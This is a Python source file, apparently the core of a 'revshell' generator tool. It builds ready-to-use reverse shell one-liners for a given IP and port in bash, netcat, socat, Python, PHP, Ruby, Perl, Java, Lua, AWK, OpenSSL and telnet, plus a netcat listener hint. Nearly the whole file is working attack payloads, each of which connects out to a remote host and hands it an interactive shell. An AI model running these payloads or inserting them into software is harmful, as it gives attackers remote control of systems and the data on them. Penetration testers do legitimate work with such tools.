"""Core logic for revshell: reverse shell payload templates."""

from __future__ import annotations

from dataclasses import dataclass


@dataclass
class ShellTemplate:
    lang: str
    description: str
    payload: str


BANNER_NOTE = "Listening shell: nc -lvnp PORT"


def _t(*, lang: str, description: str, ip: str, port: int,
       body: str) -> ShellTemplate:
    payload = body.replace("{IP}", ip).replace("{PORT}", str(port))
    return ShellTemplate(lang=lang, description=description, payload=payload)


def generate_shell(ip: str, port: int, lang: str = "all") -> list[ShellTemplate]:
    """Return reverse shell payloads for the given IP/port."""
    all_templates = _all_templates(ip, port)
    if lang == "all":
        return all_templates
    return [t for t in all_templates if t.lang.lower() == lang.lower()]


def _all_templates(ip: str, port: int) -> list[ShellTemplate]:
    return [
        _t(lang="bash", description="Bash TCP", ip=ip, port=port,
           body=(
               "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\n"
           )),
        _t(lang="bash", description="Bash UDP", ip=ip, port=port,
           body=(
               "bash -i >& /dev/udp/{IP}/{PORT} 0>&1\n"
           )),
        _t(lang="ncat", description="Netcat (mkfifo)", ip=ip, port=port,
           body=(
               "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
               "nc {IP} {PORT} >/tmp/f\n"
           )),
        _t(lang="ncat", description="Netcat -e", ip=ip, port=port,
           body=(
               "nc -e /bin/sh {IP} {PORT}\n"
           )),
        _t(lang="socat", description="Socat", ip=ip, port=port,
           body=(
               "socat TCP:{IP}:{PORT} EXEC:/bin/sh,pipes\n"
           )),
        _t(lang="python", description="Python3 shell", ip=ip, port=port,
           body=(
               "python3 -c 'import socket,subprocess,os;"
               "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
               "s.connect((\"{IP}\",{PORT}));"
               "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
               "os.dup2(s.fileno(),2);"
               "subprocess.call([\"/bin/sh\",\"-i\"])'\n"
           )),
        _t(lang="php", description="PHP shell", ip=ip, port=port,
           body=(
               "php -r '$sock=fsockopen(\"{IP}\",{PORT});"
               "exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
           )),
        _t(lang="php", description="PHP (full)", ip=ip, port=port,
           body=(
               "php -r '$sock=fsockopen(\"{IP}\",{PORT});"
               "$proc=proc_open(\"/bin/sh -i\","
               "array(0=>$sock,1=>$sock,2=>$sock),$pipes);'\n"
           )),
        _t(lang="ruby", description="Ruby shell", ip=ip, port=port,
           body=(
               "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT});"
               "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\","
               "f,f,f)'\n"
           )),
        _t(lang="perl", description="Perl shell", ip=ip, port=port,
           body=(
               "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};"
               "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
               "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
               "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
               "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"
           )),
        _t(lang="nc", description="Netcat traditional", ip=ip, port=port,
           body=(
               "nc {IP} {PORT} -e /bin/sh\n"
           )),
        _t(lang="java", description="Java shell", ip=ip, port=port,
           body=(
               "r = Runtime.getRuntime()\n"
               "p = r.exec([\"/bin/bash\",\"-c\","
               "\"exec 5<>/dev/tcp/{IP}/{PORT};"
               "cat <&5 | while read line; do $line 2>&5 >&5; done\"] as "
               "String[])\n"
           )),
        _t(lang="lua", description="Lua shell", ip=ip, port=port,
           body=(
               "lua5.1 -e 'local host,port=\"{IP}\",{PORT}\n"
               "local socket=require(\"socket\")\n"
               "local tcp=socket.tcp()\n"
               "local io=require(\"io\")\n"
               "tcp:connect(host,port);io.output(tcp);"
               "io.lines()' 2>&1 | (lua5.1 -e 'local "
               "socket=require(\"socket\");local tcp=socket.tcp();"
               "tcp:connect(\"{IP}\",{PORT});"
               "while true do local s,status=tcp:receive();"
               "if status~=\"closed\" then os.execute(s) end;"
               "end') &\n"
           )),
        _t(lang="awk", description="AWK shell", ip=ip, port=port,
           body=(
               "awk 'BEGIN {s=\"/inet/tcp/0/{IP}/{PORT}\";"
               "while(42){do{printf \"shell>\"|&s;"
               "s|&getline c;if(c){while((c|\"getline\")>0)"
               "print $0|&s;close(c)}}while(c!=\"exit\")"
               "close(s)}}' /dev/null\n"
           )),
        _t(lang="openssl", description="OpenSSL s_client", ip=ip, port=port,
           body=(
               "mkfifo /tmp/s;\n"
               "/bin/sh -i < /tmp/s 2>&1 | "
               "openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s;\n"
               "rm /tmp/s\n"
           )),
        _t(lang="telnet", description="Telnet shell", ip=ip, port=port,
           body=(
               "mkfifo /tmp/pipe; sh -i < /tmp/pipe 2>&1 | "
               "telnet {IP} {PORT} > /tmp/pipe; rm /tmp/pipe\n"
           )),
    ]


ALL_LANGS = sorted({t.lang for t in _all_templates("0.0.0.0", 0)})
